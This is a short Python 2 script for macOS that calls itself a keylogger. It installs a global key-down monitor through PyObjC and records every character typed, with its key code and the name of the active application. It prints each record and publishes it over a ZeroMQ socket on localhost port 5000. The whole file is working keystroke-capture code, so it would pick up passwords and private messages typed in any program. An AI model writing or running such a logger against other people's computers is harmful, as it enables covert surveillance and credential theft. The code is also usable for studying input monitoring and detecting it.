#!/usr/bin/python
# cocoa_keypress_monitor.py by Bjarte Johansen is licensed under a 
# License: http://ljos.mit-license.org/

from AppKit import NSApplication, NSApp, NSWorkspace
from Foundation import NSObject, NSLog
from Cocoa import NSEvent, NSKeyDownMask
from PyObjCTools import AppHelper

import zmq

context = zmq.Context()
socket = context.socket(zmq.PUB)
socket.bind("tcp://127.0.0.1:5000")
print "Keylogger: Socket initialized"

special_keys = (33, 39, 41, 51, 123, 124, 125, 126)

class AppDelegate(NSObject):
    def applicationDidFinishLaunching_(self, notification):
        mask = NSKeyDownMask
        NSEvent.addGlobalMonitorForEventsMatchingMask_handler_(mask, handler)

def handler(event):
    try:
        #NSLog(u"%@", event)
        #print event
        #print event.keyCode()
        #print event.characters(), type (event.characters()), event.keyCode()

        char = "?"
        keycode = event.keyCode()
        if keycode not in special_keys:
            try:
                char = str(event.characters())
            except UnicodeEncodeError:
                print "<UnicodeEncodeError>"
        activeAppName = NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationName']
        print '[', char, ']', keycode, activeAppName
        socket.send_string(char+':'+str(keycode)+':'+activeAppName)
        
    except KeyboardInterrupt:
        AppHelper.stopEventLoop()

def main():

    app = NSApplication.sharedApplication()
    delegate = AppDelegate.alloc().init()
    NSApp().setDelegate_(delegate)
    print "Keylogger: Logging starting"
    AppHelper.runEventLoop()
    
if __name__ == '__main__':
    main()
